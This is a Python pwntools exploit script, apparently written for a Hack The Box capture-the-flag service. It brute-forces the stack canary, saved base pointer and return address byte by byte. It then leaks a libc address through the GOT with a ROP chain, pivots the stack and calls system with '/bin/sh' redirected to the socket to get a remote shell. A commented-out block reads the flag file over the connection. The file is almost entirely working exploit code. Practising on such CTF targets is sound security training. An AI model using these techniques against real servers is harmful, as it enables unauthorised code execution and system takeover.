#!/usr/bin/python
from pwn import remote, process, context, socks, log
from struct import pack, unpack
from binascii import unhexlify, hexlify
import sys
import json

context(arch = 'amd64', os = 'linux', proxy=(socks.HTTP, '172.16.0.1', 2480))

def byte_xor(b1, b2):
    return bytes([a ^ b for a, b in zip(b1, b2)])

def hexer(d):
	d = hex(d)[2:]
	if len(d) == 1:
		return '0' + d
	else:
		return d

def write_conv(inStr):
	f = ''
	for i in inStr:
		cc = hex(i)[2:]
		if len(cc) == 1:
			f = '0' + cc + f
		else:
			f = cc + f
	return int(f[2:], 16)

def conn():
	addr = 'docker.hackthebox.eu'
	port = 31777

	while True:
		try:
			return remote(addr, port, level='error')
		except (socks.GeneralProxyError, socks.ProxyConnectionError):
			continue

def expl():
	# leaking stack canary, rbp, ret
	dump = None
	if input('get new?').decode('ascii')[:-1] == 'y':
		user_name = bytes(i^0x0d for i in b'il{dih')
		payload = user_name + 0x402*b'A'

		canary = ''
		for b in range(0, 8):
			for i in range(0, 256):
				with conn() as r:
					print(f'stack canary : {hex(i)[2:]}{canary}')
					tmp_payload = payload + bytes([i^0x0D])
					r.send(tmp_payload)
					try:
						r.recvline()
						r.close()
						payload = tmp_payload
						canary = hexer(i) + canary
						break
					except EOFError:
						continue
		
		rbp_addr = ''
		for b in range(0, 8):
			for i in range(0, 256):
				with conn() as r:
					print(f'rbp addr : {hex(i)[2:]}{rbp_addr}')
					tmp_payload = payload + bytes([i^0x0D])
					r.send(tmp_payload)
					try:
						r.recvline()
						r.close()
						payload = tmp_payload
						rbp_addr = hexer(i) + rbp_addr
						break
					except EOFError:
						continue
		
		ret_addr = ''
		for b in range(0, 8):
			for i in range(255, -1, -1):
				with conn() as r:
					print(f'ret addr : {hex(i)[2:]}{ret_addr}')
					tmp_payload = payload + bytes([i^0x0D])
					r.send(tmp_payload)
					try:
						r.recvline()
						r.close()
						payload = tmp_payload
						ret_addr = hexer(i) + ret_addr
						break
					except EOFError:
						continue
		dump = {'can': canary, 'rbp': rbp_addr, 'ret': ret_addr, 'lbc': '0'}
		with open('dump', 'w') as f:
			json.dump(dump, f)
	else:
		with open('dump', 'r') as f:
			dump = json.load(f)


	
	ret_l = int(dump['ret'], 16)
	can_l = int(dump['can'], 16)
	rbp_l = int(dump['rbp'], 16)
	lbc_l = int(dump['lbc'], 16)
	asm_base = ret_l - 0xED3

	rdi_gad = pack('Q', asm_base + 0xf73)
	rsi_gad = pack('Q', asm_base + 0xf71)
	rdx_gad = pack('Q', asm_base + 0xb53)


	if input('leak libc?').decode('ascii')[:-1] == 'y':
		# leaking libc
		got = 0x201FE0
		with conn() as r:
			r.recv()

			can_p = pack('Q', can_l) # stack canary to bypass first check
			rbp_p = pack('Q', rbp_l - 0x68 - 0x10 - 0x100) # new bp for make a stack pivot
			rdi_p = pack('Q', 0x4) # socket fd
			rsi_p = pack('Q', asm_base + got) + pack('Q', 0x0) # .plt.got
			rdx_p = pack('Q', 0x8) # write size to output got addr

			chk_user_cust_ret = pack('Q', asm_base + 0xB73) # return to (0xB73 sub  rsp, 430h) to use data in prev. stack
			wirte_add_p = pack('Q', asm_base + 0x910) # write function addr to return to

			payload = 0x308*b'A' + rbp_p + rdi_gad + rdi_p + rsi_gad + rsi_p + rdx_gad + rdx_p + wirte_add_p + 0xB8*b'B' + can_p + rbp_p + chk_user_cust_ret
			r.send(bytes(i^0x0d for i in payload))

			leaked_addr = write_conv(r.recv())
			print(hex(leaked_addr))
			dump['lbc'] = hex(leaked_addr - 0x020740)[2:] #TODO server offset for got
			with open('dump', 'w') as f:
				json.dump(dump, f)
			return
			


	sys_add = lbc_l + 0x045390 # TODO server offset
	with conn() as r:
		r.recv()

		rbp = rbp_l - 0x68 - 0x10 - 0x100
		rbp_p = pack('Q', rbp) # new bp for make a stack pivot
		payload = 0x308*b'A' + rbp_p

		rdi = pack('Q', rbp + 0x20)
		sys_add_p = pack('Q', sys_add)
		payload += rdi_gad + rdi + sys_add_p

		shell_cmd = b'/bin/sh >&4 <&4\0'

		can_p = pack('Q', can_l) # stack canary to bypass first check
		chk_user_cust_ret = pack('Q', asm_base + 0xB73) # return to (0xB73 sub  rsp, 430h) to use data in prev. stack

		payload += shell_cmd + 0xD0*b'B' + can_p + rbp_p + chk_user_cust_ret

		r.send(bytes(i^0x0d for i in payload))
		r.interactive()

expl()












'''
# print flag to fd 4
with conn() as r:
	open_add = lbc_l + 0x0bfa90 # TODO
	#open_add = lbc_l + 0xf01d0
	r.recv()

	rbp = rbp_l - 0x68 - 0x10 - 0x200
	rbp_p = pack('Q', rbp) # new bp for make a stack pivot
	payload = 0x208*b'A' + rbp_p


	# opening file
	# rdi = file name str addr
	# rsp = open file flag (read)
	rdi = pack('Q', rbp+0xB8)
	rsi = pack('Q', 0x0) + pack('Q', 0x0)
	open_addr_p = pack('Q', open_add)
	payload += rdi_gad + rdi + rsi_gad + rsi + open_addr_p


	# read from flag file and write to somewhere in stack
	# rdi = fd = 0x5
	# rsi = buff
	# rdx = 0x20
	rdi = pack('Q', 0x5)
	rsi = pack('Q', rbp - 0x300) + pack('Q', 0x0) # buff addr on stack
	rdx = pack('Q', 0x20)
	read_addr_p = pack('Q', asm_base + 0x970)
	payload += rdi_gad + rdi + rsi_gad + rsi + rdx_gad + rdx + read_addr_p


	# write flag to sock fd from stack buff
	# rdi = fd = 0x4
	# rsi = buff
	# rdx = 0x20
	rdi = pack('Q', 0x4)
	rsi = pack('Q', rbp - 0x300) + pack('Q', 0x0)
	rdx = pack('Q', 0x20)
	wirte_add_p = pack('Q', asm_base + 0x910)
	payload += rdi_gad + rdi + rsi_gad + rsi + rdx_gad + rdx + wirte_add_p


	flag_file = b'oldbridge\0\0\0\0\0\0\0'
	can_p = pack('Q', can_l) # stack canary to bypass first check
	chk_user_cust_ret = pack('Q', asm_base + 0xB73) # return to (0xB73 sub  rsp, 430h) to use data in prev. stack
	payload += flag_file + 0x138*b'B' + can_p + rbp_p + chk_user_cust_ret
	r.send(bytes(i^0x0d for i in payload))
	flag = r.recv()
	print(flag)
'''
